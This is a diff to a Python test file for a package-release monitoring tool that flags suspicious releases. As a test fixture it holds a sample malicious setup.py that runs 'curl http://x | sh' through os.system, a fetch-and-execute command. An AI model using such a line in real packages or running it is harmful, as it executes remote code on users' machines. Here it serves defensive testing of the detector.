@@ -13,6 +13,7 @@ from pydiffwatch import __main__ as cli
 from pydiffwatch import fetcher, ingest, orchestrator, reviewer, store
 from pydiffwatch import guard as guard_mod
 from pydiffwatch.models import ArtifactSet, NewRelease
+from tests.fixtures import chains
 from tests.test_pending_queue import _Backend, _REFUSED, _T, _TIMEOUT, _diff, _setup
 
 
@@ -345,7 +346,7 @@ def test_a_failure_after_triage_still_gives_up_with_its_alert(tmp_path, capsys, 
     assert [k for (k,) in _alerts(conn, "pkg")] == ["pkg|1.0.0|suspicious-heuristic|unscanned:gave_up"]
 
 
-@pytest.mark.parametrize("module, name", [(store, "review_input"), (reviewer, "dropped_from_text")])
+@pytest.mark.parametrize("module, name", [(store, "review_input"), (reviewer, "not_seen_from_text")])
 def test_a_drain_row_that_raises_is_a_bounded_failed_attempt_not_a_crashed_tick(tmp_path, capsys, monkeypatch,
                                                                                  module, name):
     # Ruling on round 1: drain_pending runs before the retry sweep and ingest, so any exception escaping it
@@ -360,7 +361,7 @@ def test_a_drain_row_that_raises_is_a_bounded_failed_attempt_not_a_crashed_tick(
     real = getattr(module, name)
 
     def broken(arg, *a, **k):
-        is_pkg = (arg["package"] == "pkg") if name == "review_input" else ("exec(x)" in a[0])
+        is_pkg = (arg["package"] == "pkg") if name == "review_input" else ("exec(x)" in arg)
         if is_pkg:
             raise ValueError("corrupt row")
         return real(arg, *a, **k)
@@ -427,9 +428,9 @@ class _Interrupted(_Backend):
         raise KeyboardInterrupt
 
 
-def _escalating_release(conn, cfg, rvw, scan_stub):
+def _escalating_release(conn, cfg, rvw, scan_stub, setup_py=b"import os\nos.system('curl http://x | sh')\n"):
     from pydiffwatch import rules
-    art = ArtifactSet("pkg", "1.1", "1.0", "sdist", {"setup.py": b"import os\nos.system('curl http://x | sh')\n"},
+    art = ArtifactSet("pkg", "1.1", "1.0", "sdist", {"setup.py": setup_py},
                       {"setup.py": b"from setuptools import setup\nsetup()\n"}, {}, [])
     orchestrator._process_fetched(cfg, conn, rvw, rules.load_rules(cfg.rules_dir), NewRelease("pkg", "1.1", 5),
                                   scan_stub.dl(art))
@@ -470,8 +471,9 @@ def test_a_finished_review_sends_no_extra_alert(tmp_path, capsys, reply, alerts,
     cfg = pq._cfg(tmp_path)
     conn = store.connect(cfg); store.init_schema(conn)
     be = _Backend()
-    be.complete = lambda **kw: pq._OK.replace('"benign"', f'"{reply}"')
-    _escalating_release(conn, cfg, reviewer.Reviewer(cfg, backend=be), scan_stub)
+    # a chain the gate passes (spec F §3.3), quoted from the shown setup.py, so a malicious reply stands
+    be.complete = lambda **kw: json.dumps(dict(json.loads(pq._OK), classification=reply, **chains.JSON_FIELDS))
+    _escalating_release(conn, cfg, reviewer.Reviewer(cfg, backend=be), scan_stub, chains.TEXT.encode())
     assert [k for (k,) in _alerts(conn, "pkg")] == alerts
     assert store.pending_reviews(conn) == []
 
